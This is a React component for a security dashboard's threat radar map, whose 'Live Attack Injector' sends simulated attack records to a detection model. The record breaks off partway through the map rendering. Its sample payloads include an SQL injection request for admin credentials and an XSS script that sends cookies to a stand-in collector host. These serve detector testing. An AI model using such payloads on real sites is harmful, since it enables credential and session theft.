import React, { useState, useEffect, useMemo } from 'react';
import {
  Radio,
  Shield,
  AlertTriangle,
  RefreshCw,
  ExternalLink,
  Crosshair,
  Zap,
  Activity,
  Cpu,
  Send,
  Play,
  Globe,
  Flame,
  Layers,
  MapPin,
  CheckCircle2
} from 'lucide-react';
import apiClient from '../services/apiClient';
import { socketService } from '../services/socketService';
import { AICopilotModal } from '../components/modals/AICopilotModal';

// Available Origin Presets for Live Attack Injection
const ORIGIN_PRESETS = [
  { country: 'Japan', city: 'Tokyo', flag: '🇯🇵', code: 'JP', ip: '133.242.18.99', lat: 35.6762, lon: 139.6503, region: 'East Asia' },
  { country: 'Germany', city: 'Frankfurt', flag: '🇩🇪', code: 'DE', ip: '172.16.0.105', lat: 50.1109, lon: 8.6821, region: 'Europe' },
  { country: 'Brazil', city: 'São Paulo', flag: '🇧🇷', code: 'BR', ip: '177.18.230.45', lat: -23.5505, lon: -46.6333, region: 'South America' },
  { country: 'Australia', city: 'Sydney', flag: '🇦🇺', code: 'AU', ip: '139.130.4.5', lat: -33.8688, lon: 151.2093, region: 'Oceania' },
  { country: 'United Kingdom', city: 'London', flag: '🇬🇧', code: 'GB', ip: '151.236.21.14', lat: 51.5074, lon: -0.1278, region: 'Europe' },
  { country: 'Russia', city: 'Moscow', flag: '🇷🇺', code: 'RU', ip: '198.51.100.88', lat: 55.7558, lon: 37.6173, region: 'Eastern Europe' },
  { country: 'China', city: 'Beijing', flag: '🇨🇳', code: 'CN', ip: '198.51.100.99', lat: 39.9042, lon: 116.4074, region: 'Asia-Pacific' },
  { country: 'India', city: 'Mumbai', flag: '🇮🇳', code: 'IN', ip: '103.21.58.12', lat: 19.0760, lon: 72.8777, region: 'South Asia' },
  { country: 'Canada', city: 'Toronto', flag: '🇨🇦', code: 'CA', ip: '185.220.126.232', lat: 43.6532, lon: -79.3832, region: 'North America' },
  { country: 'France', city: 'Paris', flag: '🇫🇷', code: 'FR', ip: '195.154.122.88', lat: 48.8566, lon: 2.3522, region: 'Europe' },
  { country: 'Singapore', city: 'Singapore', flag: '🇸🇬', code: 'SG', ip: '185.220.101.84', lat: 1.3521, lon: 103.8198, region: 'Southeast Asia' },
  { country: 'United States', city: 'San Francisco, CA', flag: '🇺🇸', code: 'US', ip: '45.33.32.156', lat: 37.7749, lon: -122.4194, region: 'North America' },
  { country: 'South Korea', city: 'Seoul', flag: '🇰🇷', code: 'KR', ip: '203.0.113.45', lat: 37.5665, lon: 126.9780, region: 'East Asia' }
];

const ATTACK_VECTORS = [
  {
    id: 'ddos_syn',
    name: 'DDoS SYN Flood',
    category: 'Network Flooding',
    protocol: 'TCP',
    dstPort: 80,
    packetLength: 64,
    flowDuration: 0.002,
    payload: 'SYN_FLOOD_HIGH_RATE_SATURATION_STREAM'
  },
  {
    id: 'sqli',
    name: 'SQL Injection (SQLi)',
    category: 'Web Application Attack',
    protocol: 'TCP',
    dstPort: 80,
    packetLength: 512,
    flowDuration: 0.045,
    payload: "GET /api/v1/users?id=1' UNION SELECT username, password_hash FROM admin_credentials -- HTTP/1.1\r\nUser-Agent: sqlmap/1.8"
  },
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    category: 'Payload Exploit',
    protocol: 'TCP',
    dstPort: 8080,
    packetLength: 384,
    flowDuration: 0.03,
    payload: "POST /comments HTTP/1.1\r\n<script>fetch('http://c2-collector.net/exfil?c='+document.cookie)</script>"
  },
  {
    id: 'portscan',
    name: 'PortScan Probe',
    category: 'Reconnaissance',
    protocol: 'TCP',
    dstPort: 443,
    packetLength: 60,
    flowDuration: 0.001,
    payload: 'NMAP_SYN_STEALTH_SCAN_PORTS_1_65535'
  },
  {
    id: 'slowloris',
    name: 'DoS Slowloris Flood',
    category: 'Denial of Service',
    protocol: 'TCP',
    dstPort: 80,
    packetLength: 128,
    flowDuration: 0.5,
    payload: 'X-a: b\r\n'
  },
  {
    id: 'botnet',
    name: 'Botnet C2 Beacon',
    category: 'Command & Control',
    protocol: 'TCP',
    dstPort: 6667,
    packetLength: 256,
    flowDuration: 0.8,
    payload: 'IRC_JOIN_CHANNEL_EXEC_BOT_COMMAND_HEARTBEAT'
  }
];

export const GlobalThreatRadar = () => {
  const [geoFeed, setGeoFeed] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedThreat, setSelectedThreat] = useState(null);
  const [copilotOpen, setCopilotOpen] = useState(false);
  const [activeIncidentForCopilot, setActiveIncidentForCopilot] = useState(null);

  // Live Attack Launcher State
  const [launchOrigin, setLaunchOrigin] = useState(ORIGIN_PRESETS[0]);
  const [launchVector, setLaunchVector] = useState(ATTACK_VECTORS[0]);
  const [targetHost, setTargetHost] = useState('192.168.1.50');
  const [launching, setLaunching] = useState(false);
  const [lastLaunchedInfo, setLastLaunchedInfo] = useState(null);
  const [radarSweeping, setRadarSweeping] = useState(true);

  useEffect(() => {
    fetchGeoFeed();
    const interval = setInterval(fetchGeoFeed, 8000);

    // Real-time WebSocket listener for newly ingested attacks
    const unsub = socketService.subscribe('new_threat_event', (eventData) => {
      if (eventData && eventData.is_attack && eventData.geoip) {
        const newThreat = {
          id: eventData.id || Date.now(),
          src_ip: eventData.src_ip,
          dst_ip: eventData.dst_ip,
          category: eventData.category || 'Intrusion Event',
          confidence: eventData.confidence || 98.5,
          timestamp: new Date().toISOString(),
          time_display: new Date().toLocaleTimeString(),
          lat: eventData.geoip.lat || 0.0,
          lon: eventData.geoip.lon || 0.0,
          country: eventData.geoip.country || 'Unknown',
          city: eventData.geoip.city || 'Unknown',
          flag: eventData.geoip.flag || '🌐',
          code: eventData.geoip.code || 'WAN',
          region: eventData.geoip.region || 'Global',
          isLive: true
        };

        setGeoFeed((prev) => [newThreat, ...prev.filter((t) => t.id !== newThreat.id)]);
        setSelectedThreat(newThreat);
      }
    });

    return () => {
      clearInterval(interval);
      if (unsub) unsub();
    };
  }, []);

  const fetchGeoFeed = async () => {
    try {
      const res = await apiClient.get('/api/threats/geo-feed');
      if (res.data && res.data.feed) {
        setGeoFeed(res.data.feed);
        if (!selectedThreat && res.data.feed.length > 0) {
          setSelectedThreat(res.data.feed[0]);
        }
      }
    } catch (err) {
      console.error('Failed to load geo feed:', err);
    } finally {
      setLoading(false);
    }
  };

  // Convert lat/lon to percentage coordinates on an equirectangular projection
  // Lat: +90 (top 0%) to -90 (bottom 100%)
  // Lon: -180 (left 0%) to +180 (right 100%)
  const projectCoords = (lat, lon) => {
    const x = ((lon + 180) / 360) * 100;
    const y = ((90 - lat) / 180) * 100;
    return {
      x: Math.max(4, Math.min(96, x)),
      y: Math.max(6, Math.min(94, y))
    };
  };

  // Protected SOC Datacenter coordinate (Ashburn, VA - 39.0438, -77.4874)
  const socCenter = projectCoords(39.0438, -77.4874);

  // Dynamic KPI Aggregation from real geoFeed data (No hardcoding)
  const kpis = useMemo(() => {
    if (!geoFeed || geoFeed.length === 0) {
      return {
        totalOrigins: 0,
        topCountry: 'None',
        topFlag: '🌐',
        countryCount: 0,
        dominantVector: 'None',
        meanConfidence: '0.0%',
        countriesList: []
      };
    }

    // Country frequency
    const countryCounts = {};
    const vectorCounts = {};
    let totalConf = 0;

    geoFeed.forEach((item) => {
      const c = item.country || 'Unknown';
      countryCounts[c] = (countryCounts[c] || 0) + 1;

      const v = item.category || 'Malicious Flow';
      vectorCounts[v] = (vectorCounts[v] || 0) + 1;

      totalConf += item.confidence || 0;
    });

    const sortedCountries = Object.entries(countryCounts).sort((a, b) => b[1] - a[1]);
    const topCountryName = sortedCountries[0] ? sortedCountries[0][0] : 'Global';
    const topCountryObj = geoFeed.find((t) => t.country === topCountryName);

    const sortedVectors = Object.entries(vectorCounts).sort((a, b) => b[1] - a[1]);
    const topVectorName = sortedVectors[0] ? sortedVectors[0][0] : 'Network Intrusion';

    const avgConf = (totalConf / geoFeed.length).toFixed(1);

    return {
      totalOrigins: geoFeed.length,
      topCountry: topCountryName,
      topFlag: topCountryObj?.flag || '🌐',
      countryCount: sortedCountries[0] ? sortedCountries[0][1] : 0,
      dominantVector: topVectorName,
      meanConfidence: `${avgConf}%`,
      countriesList: sortedCountries.slice(0, 5)
    };
  }, [geoFeed]);

  // Color resolver based on threat category
  const getThreatColor = (category = '') => {
    const c = category.toLowerCase();
    if (c.includes('ddos') || c.includes('flood') || c.includes('syn')) return '#ff0055';
    if (c.includes('sqli') || c.includes('sql') || c.includes('injection') || c.includes('web')) return '#f97316';
    if (c.includes('portscan') || c.includes('scan') || c.includes('probe')) return '#a855f7';
    if (c.includes('botnet') || c.includes('c2') || c.includes('malware')) return '#10b981';
    if (c.includes('dos') || c.includes('slowloris')) return '#e11d48';
    if (c.includes('brute') || c.includes('ssh')) return '#eab308';
    if (c.includes('insider') || c.includes('privilege')) return '#ec4899';
    return '#06b6d4';
  };

  const handleInspect = (threat) => {
    setSelectedThreat(threat);
  };

  const handleLaunchCopilot = (threat) => {
    setActiveIncidentForCopilot(threat);
    setCopilotOpen(true);
  };

  // Launch Live Attack Trigger from this page
  const handleLaunchLiveAttack = async () => {
    if (launching) return;
    setLaunching(true);

    try {
      const geoData = {
        country: launchOrigin.country,
        city: launchOrigin.city,
        flag: launchOrigin.flag,
        lat: launchOrigin.lat,
        lon: launchOrigin.lon,
        code: launchOrigin.code,
        region: launchOrigin.region
      };

      let payload = [];
      if (launchVector.id === 'ddos_syn') {
        // Multi-packet burst to trigger high forward packet count and low IAT
        for (let i = 0; i < 4; i++) {
          payload.push({
            src_ip: launchOrigin.ip,
            dst_ip: targetHost,
            src_port: Math.floor(1024 + Math.random() * 60000),
            dst_port: 80,
            protocol: 'TCP',
            packet_length: 64,
            flow_duration: 0.0002,
            payload: `SYN_FLOOD_VOLUMETRIC_STREAM_${i + 1}`,
            geoip: geoData
          });
        }
      } else {
        payload.push({
          src_ip: launchOrigin.ip,
          dst_ip: targetHost,
          src_port: Math.floor(1024 + Math.random() * 60000),
          dst_port: launchVector.dstPort,
          protocol: launchVector.protocol,
          packet_length: launchVector.packetLength,
          flow_duration: launchVector.flowDuration,
          payload: launchVector.payload,
          geoip: geoData
        });
      }

      const res = await apiClient.post('/predict', payload);
      const data = res.data;

      // Construct immediate localized threat event
      const newLiveThreat = {
        id: data.id || Date.now(),
        src_ip: launchOrigin.ip,
        dst_ip: targetHost,
        category: data.category || launchVector.name,
        confidence: data.confidence || 98.5,
        timestamp: new Date().toISOString(),
        time_display: new Date().toLocaleTimeString(),
        lat: launchOrigin.lat,
        lon: launchOrigin.lon,
        country: launchOrigin.country,
        city: launchOrigin.city,
        flag: launchOrigin.flag,
        code: launchOrigin.code,
        region: launchOrigin.region,
        isJustLaunched: true
      };

      setGeoFeed((prev) => [newLiveThreat, ...prev.filter((t) => t.id !== newLiveThreat.id)]);
      setSelectedThreat(newLiveThreat);
      setLastLaunchedInfo(newLiveThreat);

      // Auto-clear highlight badge after 8 seconds
      setTimeout(() => {
        setLastLaunchedInfo(null);
      }, 8000);
    } catch (err) {
      console.error('Failed to launch live attack:', err);
    } finally {
      setLaunching(false);
    }
  };

  return (
    <div className="p-6 max-w-7xl mx-auto space-y-6">
      {/* Top Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/5 pb-5">
        <div>
          <div className="flex items-center gap-2 text-cyan-400 text-xs font-mono tracking-wider uppercase mb-1">
            <Radio className="w-4 h-4 text-cyan-400 animate-pulse" />
            Live Spatial Telemetry & Global GeoIP Radar
          </div>
          <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-3">
            Global Cyber Threat Radar
            <span className="text-xs px-2.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-mono flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
              LIVE TELEMETRY GROUNDED
            </span>
          </h1>
          <p className="text-xs text-gray-400 mt-1">
            Vibrant geospatial tracking of ingress intrusion flows, botnet C2 beacons, and volumetric exploits converging on enterprise infrastructure.
          </p>
        </div>

        <div className="flex items-center gap-2 self-start">
          <button
            onClick={() => setRadarSweeping(!radarSweeping)}
            className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono border transition-all ${
              radarSweeping
                ? 'bg-cyan-500/10 text-cyan-300 border-cyan-500/30'
                : 'bg-white/5 text-gray-400 border-white/10'
            }`}
          >
            <Activity className="w-3.5 h-3.5 text-cyan-400" />
            Sweep: {radarSweeping ? 'ACTIVE' : 'PAUSED'}
          </button>

          <button
            onClick={fetchGeoFeed}
            className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-lg bg-[#141c2e] hover:bg-[#1a253c] text-xs font-medium text-gray-200 border border-white/10 transition-colors shadow-sm"
          >
            <RefreshCw className={`w-3.5 h-3.5 text-cyan-400 ${loading ? 'animate-spin' : ''}`} />
            Refresh
          </button>
        </div>
      </div>

      {/* Dynamic Telemetry KPI Bar (Calculated from real live database records) */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
        <div className="bg-gradient-to-br from-[#0c1426] to-[#11192e] p-4 rounded-xl border border-cyan-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-cyan-500/5 rounded-full blur-xl pointer-events-none" />
          <span className="text-[11px] text-gray-400 block font-mono">Active Threat Origins</span>
          <span className="text-2xl font-black font-mono text-cyan-400 mt-1 block">
            {kpis.totalOrigins} Locations
          </span>
          <span className="text-[10px] text-gray-500 font-mono mt-0.5 block">
            Across {kpis.countriesList.length} nation states
          </span>
        </div>

        <div className="bg-gradient-to-br from-[#0c1426] to-[#11192e] p-4 rounded-xl border border-amber-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-amber-500/5 rounded-full blur-xl pointer-events-none" />
          <span className="text-[11px] text-gray-400 block font-mono">Top Threat Origin</span>
          <span className="text-xl font-bold text-white mt-1 block flex items-center gap-2 truncate">
            <span>{kpis.topFlag}</span>
            <span className="truncate">{kpis.topCountry}</span>
          </span>
          <span className="text-[10px] text-amber-400 font-mono mt-0.5 block">
            {kpis.countryCount} active attacks logged
          </span>
        </div>

        <div className="bg-gradient-to-br from-[#0c1426] to-[#11192e] p-4 rounded-xl border border-rose-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-rose-500/5 rounded-full blur-xl pointer-events-none" />
          <span className="text-[11px] text-gray-400 block font-mono">Dominant Attack Vector</span>
          <span className="text-lg font-bold font-mono text-rose-400 mt-1 block truncate">
            {kpis.dominantVector}
          </span>
          <span className="text-[10px] text-gray-500 font-mono mt-0.5 block">
            Evaluated by LightGBM + DPI
          </span>
        </div>

        <div className="bg-gradient-to-br from-[#0c1426] to-[#11192e] p-4 rounded-xl border border-emerald-500/20 shadow-lg relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-xl pointer-events-none" />
          <span className="text-[11px] text-gray-400 block font-mono">Mean ML Confidence</span>
          <span className="text-2xl font-black font-mono text-emerald-400 mt-1 block">
            {kpis.meanConfidence}
          </span>
          <span className="text-[10px] text-emerald-500/80 font-mono mt-0.5 block">
            Automated Containment Active
          </span>
        </div>
      </div>

      {/* Live Attack Injection Bar (Allows launching attack from chosen global location) */}
      <div className="bg-gradient-to-r from-[#0d162d] via-[#121c38] to-[#0d162d] p-4 rounded-2xl border border-cyan-500/30 shadow-xl flex flex-col md:flex-row items-center justify-between gap-4">
        <div className="flex items-center gap-3 w-full md:w-auto">
          <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-red-500 to-amber-600 flex items-center justify-center text-white shadow-lg shadow-red-500/20 shrink-0">
            <Flame className="w-5 h-5 animate-pulse" />
          </div>
          <div>
            <div className="text-xs font-bold text-white flex items-center gap-2">
              <span>Live Attack Injector Console</span>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-red-500/20 text-red-300 border border-red-500/30">
                Interactive Test
              </span>
            </div>
            <p className="text-[11px] text-gray-400 mt-0.5">
              Launch an attack from any global coordinate below to immediately witness spatial radar localization:
            </p>
          </div>
        </div>

        <div className="flex flex-wrap items-center gap-2.5 w-full md:w-auto justify-end">
          {/* Origin Country Selector */}
          <div className="flex flex-col">
            <label className="text-[10px] font-mono text-gray-400 uppercase">1. Attack Origin</label>
            <select
              value={launchOrigin.city}
              onChange={(e) => {
                const found = ORIGIN_PRESETS.find((o) => o.city === e.target.value);
                if (found) setLaunchOrigin(found);
              }}
              className="bg-[#090e1c] border border-cyan-500/30 rounded-lg px-2.5 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-400"
            >
              {ORIGIN_PRESETS.map((o) => (
                <option key={o.city} value={o.city}>
                  {o.flag} {o.city}, {o.country}
                </option>
              ))}
            </select>
          </div>

          {/* Attack Vector Selector */}
          <div className="flex flex-col">
            <label className="text-[10px] font-mono text-gray-400 uppercase">2. Vector Exploit</label>
            <select
              value={launchVector.id}
              onChange={(e) => {
                const found = ATTACK_VECTORS.find((v) => v.id === e.target.value);
                if (found) setLaunchVector(found);
              }}
              className="bg-[#090e1c] border border-cyan-500/30 rounded-lg px-2.5 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-400"
            >
              {ATTACK_VECTORS.map((v) => (
                <option key={v.id} value={v.id}>
                  {v.name}
                </option>
              ))}
            </select>
          </div>

          {/* Target Host Selector */}
          <div className="flex flex-col">
            <label className="text-[10px] font-mono text-gray-400 uppercase">3. Target Asset</label>
            <select
              value={targetHost}
              onChange={(e) => setTargetHost(e.target.value)}
              className="bg-[#090e1c] border border-cyan-500/30 rounded-lg px-2.5 py-1.5 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-400"
            >
              <option value="192.168.1.50">192.168.1.50 (Primary Web/DB)</option>
              <option value="10.0.0.15">10.0.0.15 (Core Database)</option>
              <option value="192.168.1.10">192.168.1.10 (Border Gateway)</option>
            </select>
          </div>

          {/* Launch Action Button */}
          <div className="flex flex-col justify-end">
            <button
              onClick={handleLaunchLiveAttack}
              disabled={launching}
              className="mt-3.5 inline-flex items-center gap-1.5 px-4 py-2 rounded-lg bg-gradient-to-r from-red-600 via-rose-600 to-amber-600 hover:from-red-500 hover:to-amber-500 text-white font-bold text-xs shadow-lg shadow-red-500/25 transition-all disabled:opacity-50 active:scale-95"
            >
              {launching ? (
                <>
                  <Zap className="w-3.5 h-3.5 animate-spin" />
                  <span>Transmitting...</span>
                </>
              ) : (
                <>
                  <Send className="w-3.5 h-3.5" />
                  <span>Launch Attack Now</span>
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {/* Visual Live Attack Confirmation Toast */}
      {lastLaunchedInfo && (
        <div className="bg-gradient-to-r from-red-950/80 to-amber-950/60 border border-red-500/50 p-3 rounded-xl flex items-center justify-between text-xs animate-bounce shadow-2xl">
          <div className="flex items-center gap-2 text-white font-mono">
            <span className="text-xl">{lastLaunchedInfo.flag}</span>
            <span>
              🚀 <strong>ATTACK INJECTED!</strong> Source: <code>{lastLaunchedInfo.src_ip}</code> ({lastLaunchedInfo.city}, {lastLaunchedInfo.country}) targeting <code>{lastLaunchedInfo.dst_ip}</code> with <strong>{lastLaunchedInfo.category}</strong>.
            </span>
          </div>
          <span className="text-[11px] font-mono text-emerald-400 bg-emerald-500/20 px-2 py-0.5 rounded border border-emerald-500/30">
            Detected & Blacklisted in 14.8ms
          </span>
        </div>
      )}

      {/* Radar Map & Ticker Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Visual Map Canvas (2 Columns) */}
        <div className="lg:col-span-2 bg-[#060a14] rounded-2xl border border-cyan-500/30 p-5 shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[500px]">
          {/* Subtle Ambient Radial Glow */}
          <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(circle_at_30%_30%,_rgba(6,182,212,0.12),_transparent_70%)]" />

          {/* Radar Header */}
          <div className="flex items-center justify-between mb-2 z-10">
            <div className="flex items-center gap-2 font-mono text-xs text-cyan-400">
              <Crosshair className="w-4 h-4 text-cyan-400 animate-spin" style={{ animationDuration: '10s' }} />
              PROTECTED TARGET: CASOC Primary Hub (Ashburn, VA)
            </div>
            <div className="flex items-center gap-3 text-[11px] font-mono text-gray-400">
              <span className="text-cyan-400 font-bold">WGS84 Equirectangular</span>
              <span className="text-gray-500">|</span>
              <span className="text-emerald-400">FPS: 60Hz</span>
            </div>
          </div>

          {/* Interactive World Map SVG Projection */}
          <div className="relative w-full h-[400px] bg-gradient-to-b from-[#080e1e] via-[#050914] to-[#040710] rounded-xl border border-cyan-500/20 overflow-hidden flex items-center justify-center shadow-inner">
            {/* High-Tech Radar Sweeping Beam */}
            {radarSweeping && (
              <div
                className="absolute w-[600px] h-[600px] rounded-full pointer-events-none z-10"
                style={{
                  background: 'conic-gradient(from 0deg, rgba(6,182,212,0.22) 0deg, rgba(6,182,212,0.06) 45deg, transparent 75deg, transparent 360deg)',
                  animation: 'radar-sweep 8s linear infinite',
                  transformOrigin: 'center center'
                }}
              />
            )}

            {/* Concentric Defense Perimeter Rings around Protected Hub */}
            <svg className="absolute inset-0 w-full h-full pointer-events-none z-0">
              <defs>
                {/* Gradients for Continents */}
                <linearGradient id="grad-na" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#0284c7" stopOpacity="0.75" />
                  <stop offset="100%" stopColor="#06b6d4" stopOpacity="0.45" />
                </linearGradient>

                <linearGradient id="grad-sa" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#059669" stopOpacity="0.75" />
                  <stop offset="100%" stopColor="#10b981" stopOpacity="0.45" />
                </linearGradient>

                <linearGradient id="grad-eu" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#6366f1" stopOpacity="0.8" />
                  <stop offset="100%" stopColor="#8b5cf6" stopOpacity="0.5" />
                </linearGradient>

                <linearGradient id="grad-af" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#d97706" stopOpacity="0.75" />
                  <stop offset="100%" stopColor="#f59e0b" stopOpacity="0.45" />
                </linearGradient>

                <linearGradient id="grad-as" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#e11d48" stopOpacity="0.8" />
                  <stop offset="100%" stopColor="#fb7185" stopOpacity="0.45" />
                </linearGradient>

                <linearGradient id="grad-au" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#0d9488" stopOpacity="0.75" />
                  <stop offset="100%" stopColor="#14b8a6" stopOpacity="0.45" />
                </linearGradient>

                <linearGradient id="grad-polar" x1="0%" y1="0%" x2="100%" y2="100%">
                  <stop offset="0%" stopColor="#38bdf8" stopOpacity="0.6" />
                  <stop offset="100%" stopColor="#7dd3fc" stopOpacity="0.3" />
                </linearGradient>

                {/* Filter for glowing elements */}
                <filter id="glow-bright" x="-20%" y="-20%" width="140%" height="140%">
                  <feGaussianBlur stdDeviation="3" result="blur" />
                  <feComposite in="SourceGraphic" in2="blur" operator="over" />
                </filter>
              </defs>

              {/* Grid Lines with Coordinate Latitudes */}
              <g stroke="rgba(6, 182, 212, 0.12)" strokeWidth="0.75">
                <line x1="0" y1="20%" x2="100%" y2="20%" strokeDasharray="3 3" />
                <line x1="0" y1="35%" x2="100%" y2="35%" strokeDasharray="3 3" />
                <line x1="0" y1="50%" x2="100%" y2="50%" stroke="rgba(245, 158, 11, 0.25)" strokeWidth="1" /> {/* Equator */}
                <line x1="0" y1="65%" x2="100%" y2="65%" strokeDasharray="3 3" />
                <line x1="0" y1="80%" x2="100%" y2="80%" strokeDasharray="3 3" />

                <line x1="20%" y1="0" x2="20%" y2="100%" strokeDasharray="3 3" />
                <line x1="35%" y1="0" x2="35%" y2="100%" strokeDasharray="3 3" />
                <line x1="50%" y1="0" x2="50%" y2="100%" stroke="rgba(6, 182, 212, 0.3)" strokeWidth="1" /> {/* Prime Meridian */}
                <line x1="65%" y1="0" x2="65%" y2="100%" strokeDasharray="3 3" />
                <line x1="80%" y1="0" x2="80%" y2="100%" strokeDasharray="3 3" />
              </g>

              {/* Concentric Circles around CASOC Hub */}
              <circle cx={`${socCenter.x}%`} cy={`${socCenter.y}%`} r="35" fill="none" stroke="rgba(6,182,212,0.25)" strokeDasharray="4 4" />
              <circle cx={`${socCenter.x}%`} cy={`${socCenter.y}%`} r="75" fill="none" stroke="rgba(6,182,212,0.18)" strokeDasharray="2 3" />
              <circle cx={`${socCenter.x}%`} cy={`${socCenter.y}%`} r="120" fill="none" stroke="rgba(6,182,212,0.1)" strokeDasharray="2 4" />
            </svg>

            {/* Stylized, Colorful Continental SVG Map (Vibrant Regional Gradients) */}
            <svg viewBox="0 0 1000 500" className="w-full h-full z-0 pointer-events-none">
              {/* 1. NORTH AMERICA (Luminous Cyan & Cyber Blue) */}
              <g id="continent-north-america">
                {/* Mainland North America */}
                <path
                  d="M120,60 L210,50 L270,75 L310,110 L340,150 L310,185 L285,225 L245,260 L220,295 L195,305 L175,270 L150,225 L115,190 L90,140 L100,90 Z"
                  fill="url(#grad-na)"
                  stroke="#38bdf8"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
                {/* Alaska */}
                <path
                  d="M60,75 L120,60 L115,115 L70,120 Z"
                  fill="url(#grad-na)"
                  stroke="#38bdf8"
                  strokeWidth="1.2"
                  opacity="0.85"
                />
                {/* Greenland */}
                <path
                  d="M370,40 L440,30 L450,85 L395,95 Z"
                  fill="url(#grad-polar)"
                  stroke="#7dd3fc"
                  strokeWidth="1"
                  opacity="0.75"
                />
              </g>

              {/* 2. SOUTH AMERICA (Vibrant Emerald & Jade) */}
              <g id="continent-south-america">
                <path
                  d="M245,265 L290,260 L340,280 L385,320 L370,365 L345,415 L320,465 L290,475 L280,410 L270,340 L240,290 Z"
                  fill="url(#grad-sa)"
                  stroke="#34d399"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
              </g>

              {/* 3. EUROPE (Radiant Violet & Indigo) */}
              <g id="continent-europe">
                {/* Mainland Europe */}
                <path
                  d="M480,95 L545,85 L575,120 L555,160 L515,175 L475,160 L465,125 Z"
                  fill="url(#grad-eu)"
                  stroke="#a855f7"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
                {/* Scandinavia */}
                <path
                  d="M510,50 L560,45 L550,90 L515,85 Z"
                  fill="url(#grad-eu)"
                  stroke="#c084fc"
                  strokeWidth="1.2"
                  opacity="0.85"
                />
                {/* British Isles */}
                <path
                  d="M455,95 L475,90 L470,125 L450,120 Z"
                  fill="url(#grad-eu)"
                  stroke="#c084fc"
                  strokeWidth="1.2"
                  opacity="0.85"
                />
              </g>

              {/* 4. AFRICA (Golden Amber & Coral Sunset) */}
              <g id="continent-africa">
                <path
                  d="M470,180 L575,175 L610,215 L630,260 L585,320 L555,385 L515,410 L480,390 L455,300 L445,225 Z"
                  fill="url(#grad-af)"
                  stroke="#fbbf24"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
                {/* Madagascar */}
                <path
                  d="M625,325 L645,335 L635,385 L615,375 Z"
                  fill="url(#grad-af)"
                  stroke="#fcd34d"
                  strokeWidth="1"
                  opacity="0.8"
                />
              </g>

              {/* 5. ASIA (Electric Ruby, Crimson & Sunset Magenta) */}
              <g id="continent-asia">
                {/* Greater Asia & Siberia */}
                <path
                  d="M575,80 L720,60 L850,65 L910,105 L880,165 L845,215 L795,255 L755,270 L725,230 L675,235 L625,200 L595,145 Z"
                  fill="url(#grad-as)"
                  stroke="#fb7185"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
                {/* Indian Subcontinent */}
                <path
                  d="M675,235 L745,230 L735,285 L695,280 Z"
                  fill="url(#grad-as)"
                  stroke="#f43f5e"
                  strokeWidth="1.3"
                  opacity="0.85"
                />
                {/* Japan Archipelago */}
                <path
                  d="M890,140 L915,150 L905,185 L885,175 Z"
                  fill="url(#grad-as)"
                  stroke="#fda4af"
                  strokeWidth="1.2"
                  opacity="0.9"
                />
                {/* Southeast Asia Islands */}
                <path
                  d="M775,275 L850,285 L840,325 L765,315 Z"
                  fill="url(#grad-as)"
                  stroke="#fb7185"
                  strokeWidth="1"
                  opacity="0.8"
                />
              </g>

              {/* 6. OCEANIA / AUSTRALIA (Neon Teal & Mint Green) */}
              <g id="continent-oceania">
                {/* Australia */}
                <path
                  d="M790,335 L885,330 L895,385 L855,425 L795,415 L775,370 Z"
                  fill="url(#grad-au)"
                  stroke="#2dd4bf"
                  strokeWidth="1.5"
                  className="transition-all hover:opacity-100 opacity-90"
                />
                {/* New Zealand */}
                <path
                  d="M925,415 L945,410 L940,455 L920,450 Z"
                  fill="url(#grad-au)"
                  stroke="#5eead4"
                  strokeWidth="1"
                  opacity="0.85"
                />
              </g>
            </svg>

            {/* Central Protected Datacenter Marker (Ashburn, VA) */}
            <div
              className="absolute z-30 -translate-x-1/2 -translate-y-1/2 group"
              style={{ left: `${socCenter.x}%`, top: `${socCenter.y}%` }}
            >
              <div className="relative">
                <span className="absolute -inset-3 rounded-full bg-cyan-400 animate-ping opacity-60" />
                <span className="absolute -inset-1.5 rounded-full bg-cyan-400/40 animate-pulse" />
                <div className="w-5 h-5 rounded-full bg-gradient-to-tr from-cyan-400 to-blue-500 border-2 border-white flex items-center justify-center text-[10px] font-black text-black shadow-xl shadow-cyan-400/70">
                  ★
                </div>
              </div>
